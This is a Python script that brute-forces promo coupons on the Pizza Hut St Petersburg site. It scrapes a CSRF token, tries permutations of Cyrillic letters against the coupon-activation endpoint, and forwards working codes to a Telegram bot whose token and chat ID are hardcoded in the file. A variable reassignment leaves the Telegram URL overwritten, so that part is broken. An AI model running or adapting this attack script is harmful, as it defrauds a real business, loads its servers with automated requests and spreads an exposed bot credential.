#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
import itertools
import time
def get_html(url):
    r = s.get(url)
    return r.text
def get_token(html):
    soup=BeautifulSoup(html,'lxml')
    token=soup.find_all('script', type="text/javascript")[1].text
    return token[token.find('_csrfToken'):].split(',')[0][14:-1]
def gen(start_len,stop_len,token):
    ru = "абвгдеёжзийклмнопрстуфхцчшщъыьэюя"
    digits = "1234567890 "
    abc=ru
    l=0
    for i in range(start_len,stop_len):
        res = itertools.permutations(abc ,i)
        for i in res:
            k=''.join(i)
            get_promo(token,k)
            l=l+1
            if l % 1000==0:
                print(l)
def get_promo(token,code):
    data={'_token': token,
          'coupon': code }
    response=s.post('https://spb.pizzahut.ru/cart/coupon/activate',data=data).json()["success"]
    if response==True:
        print(code)
        send_mess(chat_id, code)
def send_mess(chat, text):
    session = requests.session()
    params = {'chat_id': chat, 'text': text}
    response = session.post(url + 'sendMessage', data=params)
    return response
url='https://api.telegram.org/bot626390266:AAEiOnfvAsaj20sMLwRJOFO82Gu56TWsPu4/'
chat_id=-1001308921194
print('Плехали')
url='https://spb.pizzahut.ru'
s=requests.Session()
token1=get_token(get_html(url))
gen(5,6,token1)
